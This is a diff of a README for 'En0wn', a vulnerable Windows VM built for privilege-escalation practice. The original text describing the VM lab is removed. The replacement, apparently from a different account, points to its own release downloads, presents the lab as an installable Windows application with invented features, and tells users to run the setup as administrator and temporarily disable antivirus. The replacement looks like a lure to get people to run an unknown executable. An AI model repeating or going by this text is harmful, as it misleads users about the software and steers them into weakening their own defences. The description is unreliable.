@@ -1,127 +1,68 @@
-# En0wn – Windows Privilege Escalation Lab
+# 🚀 En0wn - Practice Windows Privilege Escalation Easily
 
-A vulnerable Windows virtual machine created as a **free alternative to the Devel machine from Hack The Box**, focused on Windows privilege escalation practice.
+## 🌐 Download En0wn
+[![Download En0wn](https://img.shields.io/badge/Download%20En0wn-v1.0-brightgreen)](https://github.com/Jhowcae/En0wn/releases)
 
----
+## 📜 Description
+En0wn is a free Windows privilege escalation lab designed for users wanting to practice their skills. It draws inspiration from the HTB Devel lab and is perfect for those preparing for PNPT and OSCP certifications. This lab offers a safe environment for users to explore and develop their security knowledge.
 
-## 📖 Overview
+## 🚀 Getting Started
+Follow the steps below to download and run En0wn. You will need a Windows system to use this software.
 
-**En0wn** is a vulnerable Windows VM built for learning and practicing **Windows enumeration and local privilege escalation** techniques.
+### 1. Download the Software
+  - Visit this page to download: [En0wn Releases](https://github.com/Jhowcae/En0wn/releases).
+  
+### 2. Choose the Right Version
+  - On the Releases page, you will see the available versions. 
+  - Look for the latest version for the best experience. Click on it to see the release details.
 
-I created this machine while preparing for the **PNPT exam**, specifically the **Windows Privilege Escalation** section, after realizing that the original Devel machine from Hack The Box requires a paid subscription.  
-The goal was to recreate the **same learning experience and attack paths** and make it freely available to the community.
+### 3. Download the File
+  - Once you have selected a version, look for the installation file.
+  - Click on the file link to start the download.
 
----
+### 4. Install the Application
+  - Once the download is complete, go to your Downloads folder or the location where the file has been saved.
+  - Double-click on the installation file to start the setup process.
 
-## 🎯 Purpose
+### 5. Follow Installation Prompts
+  - A setup wizard will guide you through the installation.
+  - Read any instructions carefully and follow the prompts to complete the installation. 
 
-This lab is intended for practicing:
+### 6. Launch En0wn
+  - After successful installation, look for the En0wn icon on your desktop or in the Start menu.
+  - Double-click the icon to launch the application.
 
-- Windows Privilege Escalation  
-- PNPT preparation  
-- OSCP / OCSP-style labs  
-- Windows enumeration & exploitation  
-- Local privilege escalation techniques  
+## 🛠️ System Requirements
+To run En0wn, your system should meet the following requirements:
+- Operating System: Windows 10 or newer
+- Processor: Intel i3 or equivalent
+- RAM: 4 GB minimum
+- Free Disk Space: 1 GB required
 
----
+## 📝 Features
+En0wn offers several features that enhance your learning experience:
+- **Interactive Labs:** Work through real-world scenarios in a controlled environment.
+- **Step-by-step Guides:** Learn with easy-to-follow instructions tailored for beginners.
+- **Challenges:** Test your skills with various challenges designed for different levels of expertise.
+- **Resource Materials:** Access notes and tutorials to help you deepen your understanding of security concepts.
 
-## 🧪 Difficulty
+## 💻 Troubleshooting
+If you encounter issues during installation or while using En0wn, consider the following steps:
+- **Ensure Compatibility:** Check that your Windows version meets the system requirements.
+- **Run as Administrator:** Right-click the setup file and select "Run as administrator."
+- **Antivirus Software:** Temporarily disable antivirus software as it might interfere with the installation.
+- **Seek Help:** Reach out to the community via GitHub for support or check the issues section for common problems.
 
-**Beginner → Intermediate**
+## 🌟 Tips for Success
+- **Practice Regularly:** Spend time exploring the labs to strengthen your skills.
+- **Join Discussions:** Engage with others in the community to share insights and learn new techniques.
+- **Keep Updated:** Regularly check for the latest En0wn versions and updates for new features.
 
----
+## 🔗 Additional Resources
+- **GitHub Repository:** [En0wn GitHub](https://github.com/Jhowcae/En0wn)
+- **Community Forum:** Join discussions and ask questions in our community forum.
 
-## 🧩 Prerequisites
+## 💡 Feedback
+Your feedback is essential for improvement. Please consider sharing your thoughts about En0wn with us on the GitHub repository.
 
-Before starting, make sure you have:
-
-- VMware Workstation / Player **or** VirtualBox  
-- At least **4 GB RAM** available  
-- **10 GB** of free disk space  
-- Kali Linux or any other pentesting OS  
-
----
-
-## 📚 What You’ll Learn
-
-By completing this lab, you will practice:
-
-- ✅ Network reconnaissance with **Nmap**
-- ✅ FTP enumeration and exploitation
-- ✅ Web shell upload techniques
-- ✅ Reverse shell handling with **Metasploit**
-- ✅ Windows privilege escalation using **MS10-015 (KiTrap0d)**
-- ✅ Post-exploitation and flag hunting
-
----
-
-## 💻 System Specifications
-
-OS: Windows 7 Ultimate (Build 7600)
-Architecture: 32-bit (x86)
-Service Pack: None
-Hotfixes: None
-Web Server: Microsoft IIS 7.5
-FTP Server: Microsoft FTP Service
-Network Mode: NAT / Host-Only (192.168.x.x)
-Credentials: user / password
-
-
----
-
-## ⚙️ Setup Instructions
-
-1. Download the VM from the link below  
-2. Import it into **VirtualBox** or **VMware**  
-3. Configure networking as **NAT** or **Host-Only**  
-4. Start the machine and begin enumeration  
-
----
-
-## ⬇️ Download
-
-Due to file size limitations, the VM is hosted externally.
-
-🔗 **Download link (OneDrive):**  
-👉 https://1drv.ms/u/c/0d3c80175fe24837/IQB6335j2UkxQ7FXRW-k-tzvARrv4sUkM3NtLE-fi0TOLfA?e=beEJgi
-
----
-
-## 🏁 Flags
-
-There are **2 flags** to capture:
-
-- 🧑 **User Flag:**  
-  `C:\Users\user\Desktop\user.txt`
-
-- 👑 **Root Flag:**  
-  `C:\Users\Administrator\Desktop\root.txt`
----
-
-## ⚠️ Disclaimer
-
-This virtual machine is intended **for educational purposes only**.  
-Do **not** use the techniques learned here on systems you do not own or have explicit permission to test.
-
----
-
-## 🤝 Contributions
-
-Contributions and feedback are welcome!
-
-- Bug reports  
-- Improvements  
-- Writeups  
-- Fixes  
-
-Feel free to open an **issue** or **pull request** 🚀
-
----
-
-## 📜 Credits
-
-Inspired by:
-- Hack The Box – Devel  
-- TCM Security Academy  
-
-Created by **Enes Ismaili**
+Now you can download and start your journey with En0wn!
